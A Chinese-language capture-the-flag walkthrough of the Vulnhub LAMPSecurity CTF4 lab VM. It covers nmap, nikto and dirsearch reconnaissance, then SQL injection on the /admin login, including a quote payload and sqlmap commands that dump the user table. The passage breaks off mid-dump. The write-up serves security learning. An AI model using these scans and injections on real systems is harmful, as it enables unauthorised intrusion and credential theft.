{"pageProps":{"postData":{"id":"VulnhubLAMPSecurity CTF4","contentHtml":"<h1>LAMPSecurity: CTF4</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/lampsecurity-ctf4,83/\">https://www.vulnhub.com/entry/lampsecurity-ctf4,83/</a></p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>138</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span> \n<span class=\"hljs-comment\">//                                    </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 14:13 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00062</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00046</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00020</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">46</span>:<span class=\"hljs-number\">5</span>F:<span class=\"hljs-number\">67</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 14:16 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00064</span>s latency).\nNot shown: <span class=\"hljs-number\">65512</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response), <span class=\"hljs-number\">19</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (host-unreach)\nPORT    STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp  open   ssh\n<span class=\"hljs-number\">25</span>/tcp  open   smtp\n<span class=\"hljs-number\">80</span>/tcp  open   http\n<span class=\"hljs-number\">631</span>/tcp closed ipp\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">46</span>:<span class=\"hljs-number\">5</span>F:<span class=\"hljs-number\">67</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">25</span>,<span class=\"hljs-number\">631</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 14:20 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00046</span>s latency).\n\nPORT    STATE  SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp  open   ssh     OpenSSH <span class=\"hljs-number\">4.3</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">25</span>/tcp  open   smtp    Sendmail <span class=\"hljs-number\">8.13</span>.<span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">8.13</span>.<span class=\"hljs-number\">5</span>\n<span class=\"hljs-number\">80</span>/tcp  open   http    Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">0</span> ((Fedora))\n<span class=\"hljs-number\">631</span>/tcp closed ipp\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">46</span>:<span class=\"hljs-number\">5</span>F:<span class=\"hljs-number\">67</span> (VMware)\nDevice type: general purpose|remote management|terminal server|<span class=\"hljs-keyword\">switch</span>|proxy server|WAP\n<span class=\"hljs-title function_ invoke__\">Running</span> (JUST GUESSING): Linux <span class=\"hljs-number\">2.6</span>.X|<span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.<span class=\"hljs-title function_ invoke__\">X</span> (<span class=\"hljs-number\">98</span>%), Control4 <span class=\"hljs-title function_ invoke__\">embedded</span> (<span class=\"hljs-number\">96</span>%), Lantronix <span class=\"hljs-title function_ invoke__\">embedded</span> (<span class=\"hljs-number\">96</span>%), SNR <span class=\"hljs-title function_ invoke__\">embedded</span> (<span class=\"hljs-number\">95</span>%), SonicWALL <span class=\"hljs-title function_ invoke__\">embedded</span> (<span class=\"hljs-number\">94</span>%), Dell iDRAC <span class=\"hljs-number\">6</span> (<span class=\"hljs-number\">94</span>%)\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span> cpe:/h:lantronix:slc_8 cpe:/h:snr:snr-s2960 cpe:/o:sonicwall:aventail_ex-<span class=\"hljs-number\">6000</span> cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3.10</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4.1</span>\nAggressive OS guesses: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">16</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">21</span> (<span class=\"hljs-number\">98</span>%), Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">13</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">32</span> (<span class=\"hljs-number\">96</span>%), Control4 HC-<span class=\"hljs-number\">300</span> home <span class=\"hljs-title function_ invoke__\">controller</span> (<span class=\"hljs-number\">96</span>%), Lantronix SLC <span class=\"hljs-number\">8</span> terminal <span class=\"hljs-title function_ invoke__\">server</span> (Linux <span class=\"hljs-number\">2.6</span>) (<span class=\"hljs-number\">96</span>%), SNR SNR-S2960 <span class=\"hljs-keyword\">switch</span> (<span class=\"hljs-number\">95</span>%), SonicWALL Aventail EX-<span class=\"hljs-number\">6000</span> VPN <span class=\"hljs-title function_ invoke__\">appliance</span> (<span class=\"hljs-number\">94</span>%), Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">8</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">30</span> (<span class=\"hljs-number\">94</span>%), Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">9</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span> (<span class=\"hljs-number\">94</span>%), Dell iDRAC <span class=\"hljs-number\">6</span> remote access <span class=\"hljs-title function_ invoke__\">controller</span> (Linux <span class=\"hljs-number\">2.6</span>) (<span class=\"hljs-number\">94</span>%), Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">22</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">23</span> (<span class=\"hljs-number\">94</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> <span class=\"hljs-title function_ invoke__\">host</span> (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: ctf4.sas.upenn.edu; OS: Unix\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-php\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 14:25 CST</span>\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     <span class=\"hljs-number\">224.0</span>.<span class=\"hljs-number\">0.251</span>\n|   After <span class=\"hljs-literal\">NULL</span> UDP avahi packet <span class=\"hljs-title function_ invoke__\">DoS</span> (CVE-<span class=\"hljs-number\">2011</span>-<span class=\"hljs-number\">1002</span>).\n|_  Hosts are all <span class=\"hljs-title function_ invoke__\">up</span> (not vulnerable).\n<span class=\"hljs-comment\">// 扫描卡住不知道什么情况</span>\n</code></pre>\n<p>使用nikto扫描</p>\n<pre><code class=\"hljs language-php\">nikto -host <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span> -port <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">25</span>,<span class=\"hljs-number\">631</span>\n<span class=\"hljs-comment\">//</span>\n- Nikto v2.<span class=\"hljs-number\">5.0</span>\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n---------------------------------------------------------------------------\n+ Target IP:          <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\n+ Target Hostname:    <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\n+ Target Port:        <span class=\"hljs-number\">80</span>\n+ Start Time:         <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">23</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">33</span> (GMT8)\n---------------------------------------------------------------------------\n+ Server: Apache/<span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">0</span> (Fedora)\n+ /: Retrieved x-powered-by header: PHP/<span class=\"hljs-number\">5.1</span>.<span class=\"hljs-number\">2</span>.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https:<span class=\"hljs-comment\">//developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span>\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https:<span class=\"hljs-comment\">//www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span>\n+ /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: <span class=\"hljs-number\">487720</span>, size: <span class=\"hljs-number\">104</span>, mtime: Wed Dec <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">44</span> <span class=\"hljs-number\">2014</span>. See: http:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</span>\n+ /sql/: <span class=\"hljs-built_in\">Directory</span> indexing found.\n+ /robots.txt: Entry <span class=\"hljs-string\">'/sql/'</span> is returned a non-forbidden <span class=\"hljs-keyword\">or</span> redirect HTTP <span class=\"hljs-title function_ invoke__\">code</span> (<span class=\"hljs-number\">200</span>). See: https:<span class=\"hljs-comment\">//portswigger.net/kb/issues/00600600_robots-txt-file</span>\n+ /robots.txt: Entry <span class=\"hljs-string\">'/conf/'</span> is returned a non-forbidden <span class=\"hljs-keyword\">or</span> redirect HTTP <span class=\"hljs-title function_ invoke__\">code</span> (<span class=\"hljs-number\">500</span>). See: https:<span class=\"hljs-comment\">//portswigger.net/kb/issues/00600600_robots-txt-file</span>\n+ /robots.txt: Entry <span class=\"hljs-string\">'/admin/'</span> is returned a non-forbidden <span class=\"hljs-keyword\">or</span> redirect HTTP <span class=\"hljs-title function_ invoke__\">code</span> (<span class=\"hljs-number\">200</span>). See: https:<span class=\"hljs-comment\">//portswigger.net/kb/issues/00600600_robots-txt-file</span>\n+ /robots.txt: contains <span class=\"hljs-number\">5</span> entries which should be manually viewed. See: https:<span class=\"hljs-comment\">//developer.mozilla.org/en-US/docs/Glossary/Robots.txt</span>\n+ Apache/<span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">0</span> appears to be <span class=\"hljs-title function_ invoke__\">outdated</span> (current is at least Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">54</span>). Apache <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">34</span> is the EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2</span>.x branch.\n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .\n+ /: Web Server returns a valid response with junk HTTP methods which may cause <span class=\"hljs-literal\">false</span> positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https:<span class=\"hljs-comment\">//owasp.org/www-community/attacks/Cross_Site_Tracing</span>\n+ /admin/login.php?action=insert&#x26;username=test&#x26;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user <span class=\"hljs-string\">'test'</span> password <span class=\"hljs-string\">'test'</span> to verify. See: http:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995</span>\n+ /usage/: Webalizer may be installed. Versions lower than <span class=\"hljs-number\">2.01</span>-<span class=\"hljs-number\">09</span> vulnerable to Cross Site <span class=\"hljs-title function_ invoke__\">Scripting</span> (XSS). See: http:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835</span>\n+ /?=PHPB8B5F2A0-<span class=\"hljs-number\">3</span>C92-<span class=\"hljs-number\">11</span>d3-A3A9-<span class=\"hljs-number\">4</span>C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-<span class=\"hljs-number\">12184</span>\n+ /?=PHPE9568F34-D428-<span class=\"hljs-number\">11</span>d2-A769-<span class=\"hljs-number\">00</span>AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-<span class=\"hljs-number\">12184</span>\n+ /?=PHPE9568F35-D428-<span class=\"hljs-number\">11</span>d2-A769-<span class=\"hljs-number\">00</span>AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-<span class=\"hljs-number\">12184</span>\n+ /admin/: This might be interesting.\n+ /pages/: <span class=\"hljs-built_in\">Directory</span> indexing found.\n+ /pages/: This might be interesting.\n+ /admin/index.php: This might be interesting: has been seen in web logs <span class=\"hljs-keyword\">from</span> an unknown scanner.\n+ /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https:<span class=\"hljs-comment\">//developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span>\n+ /mail/src/read_body.php: SquirrelMail found.\n+ /icons/: <span class=\"hljs-built_in\">Directory</span> indexing found.\n+ /images/: <span class=\"hljs-built_in\">Directory</span> indexing found.\n+ /admin/admin.php?adminpy=<span class=\"hljs-number\">1</span>: PY-Membres <span class=\"hljs-number\">4.2</span> may allow administrator access. See: http:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1198</span>\n+ /icons/README: Apache <span class=\"hljs-keyword\">default</span> file found. See: https:<span class=\"hljs-comment\">//www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/</span>\n+ /admin/login.php: Admin login page/section found.\n+ /<span class=\"hljs-comment\">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>\n+ <span class=\"hljs-number\">9078</span> requests: <span class=\"hljs-number\">1</span> <span class=\"hljs-title function_ invoke__\">error</span>(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">30</span> <span class=\"hljs-title function_ invoke__\">item</span>(s) reported on remote host\n+ End Time:           <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">23</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">18</span> (GMT8) (<span class=\"hljs-number\">45</span> seconds)\n---------------------------------------------------------------------------\n+ <span class=\"hljs-number\">1</span> <span class=\"hljs-title function_ invoke__\">host</span>(s) tested\n\n</code></pre>\n<p>存在<code>/robots.txt</code> ，还发现了几个可能会有兴趣的目录</p>\n<p>优先级依然是<code>80</code>最大</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>爆破目录</p>\n<pre><code class=\"hljs language-php\">dirsearch -u <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>       \n<span class=\"hljs-comment\">//              </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">315</span>B  - /admin  ->  http:<span class=\"hljs-comment\">//192.168.75.138/admin/          </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">2</span>KB - /admin/                                           \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">200</span> -   <span class=\"hljs-number\">51</span>B  - /admin/admin.php                                  \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">2</span>KB - /admin/index.php                                  \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">16</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">769</span>B  - /admin/login.php                                  \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">318</span>B  - /calendar  ->  http:<span class=\"hljs-comment\">//192.168.75.138/calendar/    </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">289</span>B  - /cgi-bin/                                         \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf                                             \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/                                            \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/catalina.properties\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/catalina.policy\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/context.xml\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/logging.properties\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/tomcat-users.xml\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/web.xml\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/Catalina                                    \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/server.xml                                  \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">500</span> -  <span class=\"hljs-number\">617</span>B  - /conf/tomcat8.conf\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">287</span>B  - /error/                                           \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">316</span>B  - /images  ->  http:<span class=\"hljs-comment\">//192.168.75.138/images/        </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">905</span>B  - /images/\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">313</span>B  - /inc  ->  http:<span class=\"hljs-comment\">//192.168.75.138/inc/              </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">40</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">1</span>KB - /inc/                                             \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">314</span>B  - /mail  ->  http:<span class=\"hljs-comment\">//192.168.75.138/mail/            </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">302</span> -    <span class=\"hljs-number\">0</span>B  - /mail/  ->  src/login.php                         \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">50</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">315</span>B  - /pages  ->  http:<span class=\"hljs-comment\">//192.168.75.138/pages/          </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">50</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">1</span>KB - /pages/                                           \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">57</span>] <span class=\"hljs-number\">401</span> -  <span class=\"hljs-number\">480</span>B  - /restricted                                       \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">43</span>:<span class=\"hljs-number\">57</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">104</span>B  - /robots.txt                                       \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">01</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">313</span>B  - /sql  ->  http:<span class=\"hljs-comment\">//192.168.75.138/sql/              </span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">02</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">868</span>B  - /sql/                                             \n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">08</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">315</span>B  - /usage  ->  http:<span class=\"hljs-comment\">//192.168.75.138/usage/                                              </span>\n</code></pre>\n</li>\n<li>\n<p>访问感兴趣的目录</p>\n<ul>\n<li>\n<p><code>robots.txt</code></p>\n<pre><code class=\"hljs language-php\">User-agent: *\nDisallow: /mail/\nDisallow: /restricted/\nDisallow: /conf/\nDisallow: /sql/\nDisallow: /admin/\n</code></pre>\n<p>扫描出来的目录，无意义了</p>\n</li>\n<li>\n<p><code>http://192.168.75.138/mail/src/login.php</code>  SquirreMail 的登陆页面</p>\n</li>\n<li>\n<p><code>/sql/db.sql</code> 存在一个敏感文件，是创建表的数据，对sql注入可能有帮助</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-keyword\">use</span> <span class=\"hljs-title\">ehks</span>;\ncreate table <span class=\"hljs-title function_ invoke__\">user</span> (user_id <span class=\"hljs-keyword\">int</span> not <span class=\"hljs-literal\">null</span> auto_increment primary key, user_name <span class=\"hljs-title function_ invoke__\">varchar</span>(<span class=\"hljs-number\">20</span>) not <span class=\"hljs-literal\">null</span>, user_pass <span class=\"hljs-title function_ invoke__\">varchar</span>(<span class=\"hljs-number\">32</span>) not <span class=\"hljs-literal\">null</span>);\ncreate table <span class=\"hljs-title function_ invoke__\">blog</span> (blog_id <span class=\"hljs-keyword\">int</span> primary key not <span class=\"hljs-literal\">null</span> auto_increment, blog_title <span class=\"hljs-title function_ invoke__\">varchar</span>(<span class=\"hljs-number\">255</span>), blog_body text, blog_date datetime not <span class=\"hljs-literal\">null</span>);\ncreate table <span class=\"hljs-title function_ invoke__\">comment</span> (comment_id <span class=\"hljs-keyword\">int</span> not <span class=\"hljs-literal\">null</span> auto_increment primary key, comment_title <span class=\"hljs-title function_ invoke__\">varchar</span> (<span class=\"hljs-number\">50</span>), comment_body text, comment_author <span class=\"hljs-title function_ invoke__\">varchar</span>(<span class=\"hljs-number\">50</span>), comment_url <span class=\"hljs-title function_ invoke__\">varchar</span>(<span class=\"hljs-number\">50</span>), comment_date datetime not <span class=\"hljs-literal\">null</span>);\n</code></pre>\n</li>\n<li>\n<p><code>/restricted</code> 进入了提示让你输入入账号密码</p>\n</li>\n<li>\n<p><code>/admin</code> 一个登陆界面，上面的<code>sql</code>文件应该是对应这个网站的</p>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试<code>sql</code>注入<code>/admin</code> ，因为<code>db.sql</code> 把表结构爆出来了</p>\n<p><code>burp</code>抓包来尝试<code>sql</code>注入</p>\n<pre><code class=\"hljs language-php\">username=admin<span class=\"hljs-string\">'&#x26;password=1\n// \nProblem with query:\nselect user_id from user where user_name='</span>admin<span class=\"hljs-string\">''</span> AND user_pass = <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-string\">'1'</span>)\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class=\"hljs-keyword\">for</span> the right syntax to <span class=\"hljs-keyword\">use</span> <span class=\"hljs-title\">near</span> '1')' <span class=\"hljs-title\">at</span> <span class=\"hljs-title\">line</span> 2\n</code></pre>\n<p>直接把<code>sql</code>语句爆出来了，继续注入，可以使用<code>sqlmap</code> ，将抓出来的包内容复制出来保存为<code>post</code>，然后使用<code>sqlmap</code>注入</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">//POST 内容</span>\nPOST /admin/index.php HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.138</span>\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">130.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">130.0</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,image/avif,image/webp,image/png,image/svg+xml,*<span class=\"hljs-comment\">/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 34\nOrigin: http://192.168.75.138\nSec-GPC: 1\nConnection: keep-alive\nReferer: http://192.168.75.138/admin/\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nusername=*&#x26;password=1\n</span></code></pre>\n<p>直接  <code>sqlmap -r post -dbs</code> 爆出数据库名是<code>ehks</code></p>\n<p>因为<code>index</code>页面写着**<code>Professor Ehks Center for Data Studies</code>** ，所以我们把他数据<code>dump</code>出来</p>\n<p>爆出用户数据，密码没爆出来</p>\n<pre><code class=\"hljs language-php\">sqlmap -r post -D ehks -T user --dump\n<span class=\"hljs-comment\">//</span>\nuser_id\tuser_name\tuser_pass\n<span class=\"hljs-number\">1</span>\t      dstevens\t\n<span class=\"hljs-number\">2</span>\t      